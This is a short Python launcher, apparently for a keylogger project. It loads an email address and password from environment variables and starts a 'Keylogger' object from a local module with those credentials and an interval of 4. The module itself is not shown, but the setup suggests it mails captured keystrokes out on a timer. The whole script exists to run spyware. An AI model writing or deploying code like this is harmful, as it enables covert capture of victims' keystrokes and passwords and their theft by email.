import keylogger_class
from dotenv import load_dotenv
import os

load_dotenv()

EMAIL = os.getenv("EMAIL")
PASSWORD = os.getenv("PASSWORD")

my_keylogger = keylogger_class.Keylogger(4,EMAIL,PASSWORD)
my_keylogger.start()